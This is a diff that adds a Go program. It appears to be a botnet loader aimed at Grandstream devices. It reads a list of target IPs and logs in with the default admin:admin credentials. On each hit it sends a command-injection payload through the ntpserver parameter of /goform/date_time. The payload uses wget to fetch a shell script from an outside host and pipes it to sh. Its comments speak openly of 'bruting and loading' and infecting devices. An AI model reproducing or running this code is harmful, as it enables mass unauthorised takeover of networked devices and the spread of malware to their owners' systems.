@@ -1,0 +1,125 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+)
+
+func main() {
+	ips, err := ioutil.ReadFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading ips.txt file:", err)
+		return
+	}
+
+	ipPortList := strings.Split(string(ips), "\n")
+
+	headers := map[string]string{
+		"Authorization":       "Basic YWRtaW46YWRtaW4=",
+		"cache-control":       "no-cache",
+		"context-type":        "text/xml;charset=utf-8",
+		"If-Modified-Since":   "0",
+		"User-Agent":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
+		"Content-Type":        "application/x-www-form-urLEncoded",
+		"Accept":              "*/*",
+		"Referer":             "",
+		"Accept-Encoding":     "gzip, deflate",
+		"Accept-Language":     "en-US,en;q=0.9",
+		"Connection":          "close",
+	}
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
+	successfulIPs := make([]string, 0)
+
+	for _, ipPort := range ipPortList {
+		ipPort = strings.TrimSpace(ipPort)
+
+		if ipPort == "" {
+			continue
+		}
+
+		url := fmt.Sprintf("http://%s/Pages/system.html", ipPort)
+		headers["Referer"] = fmt.Sprintf("http://%s/index.html", ipPort)
+
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			fmt.Printf("Error creating request for %s: %v\n", ipPort, err)
+			continue
+		}
+
+		for key, value := range headers {
+			req.Header.Set(key, value)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		defer resp.Body.Close()
+
+		if resp.StatusCode == http.StatusOK {
+			successfulIPs = append(successfulIPs, ipPort)
+
+			err := sendModifiedRequest(ipPort, client, headers)
+			if err != nil {
+				fmt.Printf("Error sending modified request to %s: %v\n", ipPort, err)
+			}
+		}
+	}
+
+	err = writeSuccessfulIPs(successfulIPs)
+	if err != nil {
+		fmt.Println("Error writing successful IPs to file:", err)
+		return
+	}
+
+	fmt.Println("[GRANDSTREAM] successfuly finished bruting and loading.")
+}
+
+func sendModifiedRequest(ipPort string, client *http.Client, headers map[string]string) error {
+	url := fmt.Sprintf("http://%s/goform/date_time?cmd=set&updatemode=1&ntpserverenable=1&ntpserver=%%3B%%2524(wget%%2520http%%253A%%252F%%252FIP%%252Fgrandstream.sh%%2520-O%%2520-%%257Csh)&timezone=17", ipPort)
+
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return err
+	}
+
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+
+	return nil
+}
+
+// writes the successful ones here, but idk no point since it infects it anyway
+
+func writeSuccessfulIPs(successfulIPs []string) error {
+	file, err := os.Create("successful.txt")
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	for _, ipPort := range successfulIPs {
+		_, err := file.WriteString(fmt.Sprintf("%s\n", ipPort))
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
